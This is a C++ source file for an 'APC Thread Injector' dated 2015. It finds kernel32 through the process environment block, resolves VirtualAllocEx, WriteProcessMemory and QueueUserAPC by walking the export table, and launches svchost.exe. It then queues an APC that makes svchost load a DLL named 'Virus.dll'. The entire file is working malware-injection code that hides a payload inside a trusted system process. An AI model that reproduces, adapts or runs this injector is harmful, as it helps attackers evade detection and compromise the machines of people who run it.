﻿#include <vcl.h>
#pragma hdrstop
#include <tchar.h>
/*
	APC Thread Injector ( Thread Message Insert )
	By. aaaddress1@gmail.com
	DATE: 2015/5/17.
*/

DWORD GetKernel32Mod()
{
	DWORD dRetn = 0;
	asm
	{
		mov ebx,fs:[0x30] //PEB
		mov ebx,[ebx+0x0c]//Ldr
		mov ebx,[ebx+0x1c]//InInitializationOrderModuleList
		Search:
		mov eax,[ebx+0x08]//Point to Current Modual Base.
		mov ecx,[ebx+0x20]//Point to Current Name.
		mov ecx,[ecx+0x18]
		cmp cl,0x00//Test if Name[25] == \x00.
		mov ebx,[ebx+0x00]
		jne Search
		mov [dRetn],eax
	}
	return dRetn;
}

DWORD GetFuncAddr(HMODULE hModule,char* FuncName)
{
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = PIMAGE_EXPORT_DIRECTORY(pNtHeader->OptionalHeader.DataDirectory[0].VirtualAddress + (PBYTE)hModule);//外導函數

	PDWORD pAddressName = PDWORD((PBYTE)hModule+pExportDirectory->AddressOfNames); //函數名稱陣列
	PWORD pAddressOfNameOrdinals = (PWORD)((PBYTE)hModule+pExportDirectory->AddressOfNameOrdinals); //函数名称序号表指针
	PDWORD pAddresOfFunction = (PDWORD)((PBYTE)hModule+pExportDirectory->AddressOfFunctions); //函数地址表指针

	for (int index = 0; index < (pExportDirectory->NumberOfNames); index++)
	{
		char* pFunc = (char*)((long)hModule + *pAddressName);
		DWORD CurrentAddr = (DWORD)( (PBYTE)hModule + pAddresOfFunction[*pAddressOfNameOrdinals]);

		if (!strcmp(pFunc, FuncName)) return (CurrentAddr);
		pAddressName ++;
		pAddressOfNameOrdinals++;//ENT和函数名序号数组两个并行数组同时滑动指针(序号数组中的序号就对应函数名对应的函数地址的数组索引)
	}
 return (NULL);
}

PROCESS_INFORMATION CreateSvchost()
{
	STARTUPINFO StartInfo = {};
	PROCESS_INFORMATION ProcInfo = {};
	StartInfo.cb = sizeof(StartInfo);
	int result = CreateProcess(L"C:\\Windows\\system32\\svchost.exe",
								0,
								0,
								0,
								0,
								0,
								0,
								0,
								&StartInfo,
								&ProcInfo);
	return ProcInfo;
}

bool APCInjectDll(HANDLE pHandle,HANDLE ThreadHandle,AnsiString InjectDllPath)
{
	char* DllPath = InjectDllPath.c_str() ;
	DWORD DllPathLen = strlen(DllPath) + 1;

	HMODULE Kernel32_Addr = (HMODULE)GetKernel32Mod();
	FARPROC LoadLibraryA_Addr = (FARPROC)GetFuncAddr(Kernel32_Addr,"LoadLibraryA");

	int __stdcall (*nVallocEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
	) = (int (__stdcall*)(void*,void*,DWORD,DWORD,DWORD))GetFuncAddr(Kernel32_Addr,"VirtualAllocEx");

	bool __stdcall (*nWPM)(
	HANDLE hProcess,
	LPVOID lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T nSize,
	SIZE_T * lpNumberOfBytesWritten
	) = (bool (__stdcall*)(HANDLE,LPVOID,LPCVOID ,SIZE_T,SIZE_T *))GetFuncAddr(Kernel32_Addr,"WriteProcessMemory");

	DWORD __stdcall (*nAPC)(
	PAPCFUNC pfnAPC,
	HANDLE hThread,
	ULONG_PTR dwData
	) = (DWORD (__stdcall*)(PAPCFUNC,HANDLE,ULONG_PTR))GetFuncAddr(Kernel32_Addr,"QueueUserAPC");

	PVOID param = (PVOID)nVallocEx( pHandle , 0, DllPathLen ,MEM_COMMIT | MEM_TOP_DOWN,PAGE_READWRITE);
	if (!param) return false;
	if (!nWPM(pHandle , param,(LPVOID)DllPath, DllPathLen, 0)) return false;
	nAPC((PAPCFUNC)LoadLibraryA_Addr, ThreadHandle ,(DWORD)param);
	return true;
}


void InjectFunc()
{
	AnsiString CurPath = ExtractFilePath(Application->ExeName);
	PROCESS_INFORMATION Svchost_Info = CreateSvchost();
	APCInjectDll(Svchost_Info.hProcess,Svchost_Info.hThread,AnsiString(CurPath + "Virus.dll"));
}

int WINAPI _tWinMain(HINSTANCE, HINSTANCE, LPTSTR, int)
{
	InjectFunc();
	return 0;
}
//---------------------------------------------------------------------------
